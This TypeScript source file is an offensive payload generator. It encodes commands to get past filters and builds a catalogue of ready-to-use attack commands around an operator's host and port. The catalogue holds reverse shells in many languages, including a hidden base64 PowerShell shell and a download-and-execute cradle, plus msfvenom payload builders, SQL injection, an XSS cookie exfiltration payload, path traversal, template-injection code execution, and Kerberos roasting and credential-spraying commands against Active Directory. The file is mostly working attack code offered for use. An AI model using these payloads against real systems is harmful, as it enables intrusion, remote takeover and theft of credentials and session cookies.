/**
 * payloadCrafterUtils.ts
 * Interactive Offensive Payload Generator & Real-Time Bypass Encoding Matrix.
 * Generates reverse shells, web exploit vectors, and multi-format bypass encoders.
 */

export type BypassEncoderType =
  | 'raw'
  | 'url'
  | 'double-url'
  | 'base64'
  | 'powershell-base64'
  | 'hex-slash'
  | 'hex-0x'
  | 'space-ifs'
  | 'space-brace-ifs'
  | 'space-plus'
  | 'html-entities';

export interface PayloadEncoderOption {
  id: BypassEncoderType;
  label: string;
  badge: string;
  description: string;
}

export const ENCODER_OPTIONS: PayloadEncoderOption[] = [
  { id: 'raw', label: 'Plaintext', badge: 'RAW', description: 'Unmodified raw payload' },
  { id: 'url', label: 'URL Encode', badge: 'URL', description: 'Standard URI percentage encoding (%xx)' },
  { id: 'double-url', label: 'Double URL', badge: '2xURL', description: 'WAF bypass double URL percentage encoding (%25xx)' },
  { id: 'base64', label: 'Base64', badge: 'B64', description: 'Standard Base64 encoding' },
  { id: 'powershell-base64', label: 'PowerShell Enc', badge: 'PS-UTF16', description: 'UTF-16LE Base64 for powershell.exe -EncodedCommand' },
  { id: 'hex-slash', label: 'Hex (\\x)', badge: '\\xHH', description: 'C-style hex byte escape string' },
  { id: 'hex-0x', label: 'Hex (0x)', badge: '0xHH', description: 'SQL-friendly concatenated hex literals' },
  { id: 'space-ifs', label: '$IFS$9 Space', badge: '$IFS', description: 'Linux shell space filter evasion ($IFS$9)' },
  { id: 'space-brace-ifs', label: '${IFS} Space', badge: '${IFS}', description: 'Linux shell space filter evasion (${IFS})' },
  { id: 'space-plus', label: '+ Space Bypass', badge: '+', description: 'URL / form space substitution (+)' },
  { id: 'html-entities', label: 'HTML Entities', badge: '&#x;', description: 'Numeric HTML character reference' },
];

/**
 * Apply selected bypass encoder to raw payload string
 * Call-stack safe UTF-16LE implementation avoids RangeError
 */
export function applyBypassEncoder(text: string, encoder: BypassEncoderType): string {
  if (!text) return '';

  switch (encoder) {
    case 'raw':
      return text;

    case 'url':
      return encodeURIComponent(text);

    case 'double-url':
      return encodeURIComponent(encodeURIComponent(text));

    case 'base64':
      try {
        return btoa(unescape(encodeURIComponent(text)));
      } catch {
        return btoa(text);
      }

    case 'powershell-base64': {
      // Call-stack safe UTF-16LE Base64 conversion
      const utf16Bytes: number[] = [];
      for (let i = 0; i < text.length; i++) {
        const code = text.charCodeAt(i);
        utf16Bytes.push(code & 0xff);
        utf16Bytes.push((code >> 8) & 0xff);
      }

      // Chunked conversion to prevent call stack overflow on large commands
      let binaryStr = '';
      const chunkSize = 8192;
      for (let i = 0; i < utf16Bytes.length; i += chunkSize) {
        const chunk = utf16Bytes.slice(i, i + chunkSize);
        binaryStr += String.fromCharCode.apply(null, chunk);
      }
      return btoa(binaryStr);
    }

    case 'hex-slash': {
      let result = '';
      for (let i = 0; i < text.length; i++) {
        const hex = text.charCodeAt(i).toString(16).padStart(2, '0');
        result += `\\x${hex}`;
      }
      return result;
    }

    case 'hex-0x': {
      let result = '0x';
      for (let i = 0; i < text.length; i++) {
        result += text.charCodeAt(i).toString(16).padStart(2, '0');
      }
      return result;
    }

    case 'space-ifs':
      return text.replace(/ /g, '$IFS$9');

    case 'space-brace-ifs':
      return text.replace(/ /g, '${IFS}');

    case 'space-plus':
      return text.replace(/ /g, '+');

    case 'html-entities': {
      let result = '';
      for (let i = 0; i < text.length; i++) {
        result += `&#${text.charCodeAt(i)};`;
      }
      return result;
    }

    default:
      return text;
  }
}

export interface TacticalPayload {
  id: string;
  category: 'revshell' | 'web' | 'msfvenom' | 'privesc' | 'ad';
  subCategory: string;
  title: string;
  os: 'Linux' | 'Windows' | 'Cross-Platform';
  commandTemplate: string;
  description: string;
  recommendedPort?: number;
}

/**
 * Generate full catalog of dynamic tactical payloads with variable interpolation
 */
export function getTacticalPayloads(vars: {
  lhost: string;
  lport: string;
  targetIp: string;
  domain?: string;
  user?: string;
  password?: string;
}): TacticalPayload[] {
  const { lhost, lport, targetIp, domain = 'corp.local', user = 'administrator', password = 'Password123!' } = vars;

  return [
    // --- REVERSE SHELLS: LINUX ---
    {
      id: 'bash-i',
      category: 'revshell',
      subCategory: 'Bash',
      title: 'Bash -i Interactive TCP',
      os: 'Linux',
      commandTemplate: `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`,
      description: 'Standard interactive bash reverse shell using /dev/tcp socket redirection.',
      recommendedPort: 4444,
    },
    {
      id: 'bash-196',
      category: 'revshell',
      subCategory: 'Bash',
      title: 'Bash 196 File Descriptor',
      os: 'Linux',
      commandTemplate: `0<&196;exec 196<>/dev/tcp/${lhost}/${lport}; sh <&196 >&196 2>&196`,
      description: 'Alternative bash descriptor redirection that bypasses simple command string filters.',
    },
    {
      id: 'bash-read-line',
      category: 'revshell',
      subCategory: 'Bash',
      title: 'Bash Read Line TCP',
      os: 'Linux',
      commandTemplate: `exec 5<>/dev/tcp/${lhost}/${lport};cat <&5 | while read line; do $line 2>&5 >&5; done`,
      description: 'Line-by-line bash execution loop through descriptor 5.',
    },
    {
      id: 'python3-pty',
      category: 'revshell',
      subCategory: 'Python',
      title: 'Python3 Socket & PTY Spawn',
      os: 'Linux',
      commandTemplate: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${lhost}",${lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'`,
      description: 'Full PTY-spawning python reverse shell providing responsive TTY.',
    },
    {
      id: 'python3-short',
      category: 'revshell',
      subCategory: 'Python',
      title: 'Python3 Compact Reverse Shell',
      os: 'Linux',
      commandTemplate: `python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("${lhost}",${lport}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'`,
      description: 'Shortened Python one-liner for command length restrictions.',
    },
    {
      id: 'nc-mkfifo',
      category: 'revshell',
      subCategory: 'Netcat',
      title: 'Netcat Traditional (mkfifo FIFO)',
      os: 'Linux',
      commandTemplate: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${lhost} ${lport} >/tmp/f`,
      description: 'Works on almost all Unix targets regardless of whether Netcat has -e support.',
    },
    {
      id: 'nc-e',
      category: 'revshell',
      subCategory: 'Netcat',
      title: 'Netcat -e Execution Flag',
      os: 'Linux',
      commandTemplate: `nc -e /bin/bash ${lhost} ${lport}`,
      description: 'Direct Netcat execution if target binary was compiled with GAPING_SECURITY_HOLE.',
    },
    {
      id: 'socat-exec',
      category: 'revshell',
      subCategory: 'Socat',
      title: 'Socat TCP Exec Reverse Shell',
      os: 'Linux',
      commandTemplate: `socat tcp-connect:${lhost}:${lport} exec:"bash -li",pty,stderr,setsid,sigint,sane`,
      description: 'Spawn a fully interactive pseudo-terminal via socat directly into a listener.',
    },
    {
      id: 'php-exec',
      category: 'revshell',
      subCategory: 'PHP',
      title: 'PHP CLI One-Liner',
      os: 'Cross-Platform',
      commandTemplate: `php -r '$sock=fsockopen("${lhost}",${lport});exec("/bin/sh -i <&3 >&3 2>&3");'`,
      description: 'Single-line PHP reverse shell executing directly on host CLI.',
    },
    {
      id: 'node-child-process',
      category: 'revshell',
      subCategory: 'Node.js',
      title: 'Node.js Socket Spawner',
      os: 'Cross-Platform',
      commandTemplate: `node -e 'require("child_process").spawn("/bin/sh",[]).stdin.pipe(require("net").connect(${lport},"${lhost}")).pipe(process.stdout)'`,
      description: 'Node.js socket pipe reverse shell.',
    },

    // --- REVERSE SHELLS: WINDOWS ---
    {
      id: 'powershell-tcp-client',
      category: 'revshell',
      subCategory: 'PowerShell',
      title: 'PowerShell System.Net.Sockets TCPClient',
      os: 'Windows',
      commandTemplate: `$client = New-Object System.Net.Sockets.TCPClient('${lhost}',${lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`,
      description: 'Native Windows PowerShell interactive reverse shell without external dependencies.',
    },
    {
      id: 'powershell-encoded-cmd',
      category: 'revshell',
      subCategory: 'PowerShell',
      title: 'PowerShell -EncodedCommand Wrapper',
      os: 'Windows',
      commandTemplate: `powershell.exe -nop -w hidden -e ${applyBypassEncoder(
        `$c = New-Object System.Net.Sockets.TCPClient('${lhost}',${lport});$s = $c.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $d 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()`,
        'powershell-base64'
      )}`,
      description: 'Base64 encoded command that avoids quotes, backslashes, and special character stripping in web command injections.',
    },
    {
      id: 'powershell-iex-download',
      category: 'revshell',
      subCategory: 'PowerShell',
      title: 'PowerShell IEX Web Cradle',
      os: 'Windows',
      commandTemplate: `powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://${lhost}:8000/shell.ps1')"`,
      description: 'Memory-only execution cradle downloading Nishang or Invoke-PowerShellTcp.ps1 from operator web server.',
    },
    {
      id: 'nc-exe-cmd',
      category: 'revshell',
      subCategory: 'Netcat',
      title: 'Windows nc.exe / cmd.exe',
      os: 'Windows',
      commandTemplate: `nc.exe ${lhost} ${lport} -e cmd.exe`,
      description: 'Standard Windows Netcat reverse shell executing cmd.exe.',
    },

    // --- MSFVENOM GENERATORS ---
    {
      id: 'msfvenom-linux-elf',
      category: 'msfvenom',
      subCategory: 'Payloads',
      title: 'Linux x64 ELF Reverse TCP',
      os: 'Linux',
      commandTemplate: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=${lhost} LPORT=${lport} -f elf -o shell.elf && chmod +x shell.elf`,
      description: 'Stageless 64-bit Linux ELF binary.',
    },
    {
      id: 'msfvenom-windows-exe',
      category: 'msfvenom',
      subCategory: 'Payloads',
      title: 'Windows x64 Staged Meterpreter EXE',
      os: 'Windows',
      commandTemplate: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${lhost} LPORT=${lport} -f exe -o payload.exe`,
      description: 'Standard Windows 64-bit Meterpreter reverse TCP executable.',
    },
    {
      id: 'msfvenom-windows-aspx',
      category: 'msfvenom',
      subCategory: 'Payloads',
      title: 'IIS ASPX Web Shell (Devel / Windows)',
      os: 'Windows',
      commandTemplate: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=${lhost} LPORT=${lport} -f aspx -o shell.aspx`,
      description: 'IIS web shell payload ideal for Microsoft-IIS upload vectors (e.g. HTB Devel).',
    },
    {
      id: 'msfvenom-war-tomcat',
      category: 'msfvenom',
      subCategory: 'Payloads',
      title: 'Tomcat WAR Archive Web Shell',
      os: 'Cross-Platform',
      commandTemplate: `msfvenom -p java/jsp_shell_reverse_tcp LHOST=${lhost} LPORT=${lport} -f war -o shell.war`,
      description: 'Java WAR archive for deployment via Apache Tomcat Manager web GUI.',
    },

    // --- WEB INJECTION & BYPASS VECTORS ---
    {
      id: 'sqli-auth-bypass',
      category: 'web',
      subCategory: 'SQLi',
      title: 'SQLi Classic Authentication Bypass',
      os: 'Cross-Platform',
      commandTemplate: `' OR '1'='1' -- `,
      description: 'Universal SQL injection payload to bypass login forms and authentication queries.',
    },
    {
      id: 'sqli-union-test',
      category: 'web',
      subCategory: 'SQLi',
      title: 'SQLi Union Column Probe',
      os: 'Cross-Platform',
      commandTemplate: `' UNION SELECT NULL, NULL, NULL, @@version -- `,
      description: 'Determine number of columns and verify active database software version.',
    },
    {
      id: 'xss-cookie-stealer',
      category: 'web',
      subCategory: 'XSS',
      title: 'XSS Cookie Exfiltration Payload',
      os: 'Cross-Platform',
      commandTemplate: `<script>new Image().src='http://${lhost}:${lport}/log?c='+encodeURIComponent(document.cookie);</script>`,
      description: 'Exfiltrate victim session cookies directly to operator HTTP/Netcat listener.',
    },
    {
      id: 'lfi-passwd',
      category: 'web',
      subCategory: 'LFI',
      title: 'LFI Linux /etc/passwd Deep Traversal',
      os: 'Linux',
      commandTemplate: `../../../../../../../../etc/passwd`,
      description: 'Deep directory traversal payload to read sensitive user account configurations.',
    },
    {
      id: 'lfi-php-wrapper',
      category: 'web',
      subCategory: 'LFI',
      title: 'PHP Filter Base64 Source Disclosure',
      os: 'Cross-Platform',
      commandTemplate: `php://filter/convert.base64-encode/resource=index.php`,
      description: 'Extract raw PHP server-side source code before execution via php:// filter wrapper.',
    },
    {
      id: 'ssti-jinja2',
      category: 'web',
      subCategory: 'SSTI',
      title: 'SSTI Jinja2 / Python RCE Discovery',
      os: 'Linux',
      commandTemplate: `{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}`,
      description: 'Server-Side Template Injection execution in Python Jinja2 / Flask templates.',
    },

    // --- ACTIVE DIRECTORY ENUMERATION ---
    {
      id: 'ad-asrep-roast',
      category: 'ad',
      subCategory: 'Kerberos',
      title: 'Impacket GetNPUsers (AS-REP Roasting)',
      os: 'Windows',
      commandTemplate: `GetNPUsers.py ${domain}/ -usersfile users.txt -format hashcat -outputfile asrep.hashes -dc-ip ${targetIp} -no-pass`,
      description: 'Query users with DONT_REQ_PREAUTH set to dump decryptable Kerberos ticket hashes.',
    },
    {
      id: 'ad-kerberoast',
      category: 'ad',
      subCategory: 'Kerberos',
      title: 'Impacket GetUserSPNs (Kerberoasting)',
      os: 'Windows',
      commandTemplate: `GetUserSPNs.py ${domain}/${user}:${password} -dc-ip ${targetIp} -request -outputfile kerberoast.hashes`,
      description: 'Request TGS service tickets for accounts with registered SPNs for offline cracking.',
    },
    {
      id: 'ad-bloodhound-collect',
      category: 'ad',
      subCategory: 'BloodHound',
      title: 'BloodHound Python Ingestor',
      os: 'Windows',
      commandTemplate: `bloodhound-python -u '${user}' -p '${password}' -d ${domain} -ns ${targetIp} -c All --zip`,
      description: 'Collect all Domain Users, Groups, Computers, ACLs, and Sessions for BloodHound analysis.',
    },
    {
      id: 'ad-netexec-smb',
      category: 'ad',
      subCategory: 'NetExec',
      title: 'NetExec SMB Credential Spray & Check',
      os: 'Windows',
      commandTemplate: `nxc smb ${targetIp} -u '${user}' -p '${password}' --shares`,
      description: 'Verify administrative privileges and list accessible SMB shares on Domain Controller.',
    },
  ];
}
